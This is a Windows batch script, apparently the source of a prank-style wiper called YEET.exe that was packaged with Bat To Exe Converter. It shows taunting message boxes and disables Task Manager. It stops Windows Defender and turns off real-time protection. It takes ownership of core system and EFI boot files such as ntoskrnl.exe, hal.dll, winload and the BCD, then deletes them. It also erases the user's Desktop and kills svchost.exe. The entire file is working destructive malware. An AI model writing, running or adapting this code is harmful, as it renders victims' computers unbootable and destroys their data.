::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MAE+1EbsQ5+n//Na+h2gpGucnfe8=
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
echo x=msgbox("do you know what you are running?",0+4,"YEET.exe (made by ThePCMaster)")>yt.vbs
attrib +h yt.vbs
wscript yt.vbs
attrib -h yt.vbs
copy YEET.bat YT.bat
attrib +h YT.bat
start yt.bat
del %userprofile%\Desktop\YEET.* /f
echo x=msgbox("because you totally do not now :)",0+0,"YEET.exe (made by ThePCMaster)")>yt.vbs
attrib +h yt.vbs
wscript yt.vbs
attrib -h yt.vbs
echo x=msgbox("yes, this malware can run even if it is deleted!",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
attrib +h yt.vbs
wscript yt.vbs
attrib -h yt.vbs
echo x=msgbox("oh also do not try to kill cmd.exe through task manager i have blocked it ;)",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
attrib +h yt.vbs
wscript yt.vbs
attrib -h yt.vbs
del yt.vbs /f
echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
attrib +h yt.vbs
wscript yt.vbs
del yt.vbs /f
sc stop WinDefend
powershell set-mppreference -disablerealtimemonitoring $true
cd C:\Windows\System32
mountvol W: /s
takeown /f hal.dll
takeown /f winload.efi
takeown /f winload.exe
takeown /f drivers /r /d y
takeown /f Boot /r /d y
takeown /f ..\Boot /r /d y
takeown /f W:\EFI\Boot\bootx64.efi
takeown /f W:\EFI\Microsoft\Boot\BCD
takeown /f ntoskrnl.exe
takeown /f config /r /d y
takeown /f ci.dll
takeown /f svchost.exe
takeown /f csrss.exe
takeown /f autochk.exe
takeown /f chkdsk.exe
takeown /f smss.exe
takeown /f winlogon.exe
takeown /f ..\regedit.exe
takeown /f reg.exe
takeown /f wininit.exe
takeown /f ntdll.dll
icacls ntdll.dll /grant %username%:F
icacls svchost.exe /grant %username%:F
icacls wininit.exe /grant %username%:F
icacls csrss.exe /grant %username%:F
icacls winlogon.exe /grant %username%:F
icacls chkdsk.exe /grant %username%:F
icacls autochk.exe /grant %username%:F
icacls smss.exe /grant %username%:F
icacls ..\regedit.exe /grant %username%:F
icacls reg.exe /grant %username%:F
icacls hal.dll /grant %username%:F
icacls winload.efi /grant %username%:F
icacls winload.exe /grant %username%:F
echo y|cacls drivers /g %username%:F /t
echo y|cacls Boot /g %username%:F /t
echo y|cacls ..\Boot /g %username%:F /t
icacls W:\EFI\Boot\bootx64.efi /grant %username%:F
icacls W:\EFI\Microsoft\Boot\BCD /grant %username%:F
icacls ntoskrnl.exe /grant %username%:F
icacls ci.dll /grant %username%:F
echo y|cacls config /g %username%:F /t
takeown /f %userprofile%\Desktop
cacls %userprofile%\desktop /g %userprofile%:F /t
rd %userprofile%\Desktop /s /q
echo x=msgbox("refresh your desktop ;)",0,"YEET.exe (made by ThePCMaster)")>%userprofile%\yt.vbs
wscript %userprofile%\yt.vbs
del %userprofile%\yt.vbs /f
del hal.dll /f
del wininit.exe /f
del winload.efi /f
del winload.exe /f
rd drivers /s /q
rd Boot /s /q
rd ..\Boot /s /q
del W:\EFI\Boot\bootx64.efi /f
del W:\EFI\Microsoft\Boot\BCD /f
del ntoskrnl.exe /f
rd config /s /q
del ntdll.dll /f
del ci.dll /f
del svchost.exe /f
del csrss.exe /f
del smss.exe /f
del chkdsk.exe /f
del winlogon.exe /f
del autochk.exe /f
del ..\regedit.exe /f
del reg.exe /f
md config
echo dead>config\OSDATA
mkdir %userprofile%\Desktop
cd %userprofile%\Desktop
timeout /t 15 /nobreak
echo x=msgbox("You got your computer screwed up successfully.",48+0,"Microsoft Windows")>yt.vbs
attrib +h yt.vbs
wscript yt.vbs
del yt.vbs /f
taskkill /f /im svchost.exe